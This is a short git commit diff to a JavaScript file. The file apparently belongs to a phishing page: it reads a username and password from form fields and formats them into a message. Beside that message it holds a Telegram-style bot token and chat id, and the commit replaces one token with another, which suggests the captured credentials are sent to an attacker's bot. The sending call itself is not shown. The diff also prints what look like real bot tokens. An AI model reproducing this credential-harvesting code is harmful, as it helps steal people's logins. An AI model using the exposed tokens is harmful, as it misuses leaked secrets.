465e0093df6f5160f037f29f958559971ed80757
kosaeer <58988897+kosaeer@users.noreply.github.com>
2020-01-04 22:07:30 +0300

    Update main.js

--- main.js
+++ main.js
@@ -33,7 +33,7 @@ var pass = $("#pass").val();
 
 var text = "user : `" + username + "` || pass : `" + pass + "`" 
 
-var token = "801870955:AAE2m8IagrjoLf7XUxi27audKvv50jj_CH8";
+var token = "1040670629:AAESKX3wsBQWgwIrRhUGQM3zNrG0pX-abIE";
 
 var id = "387534219";
 
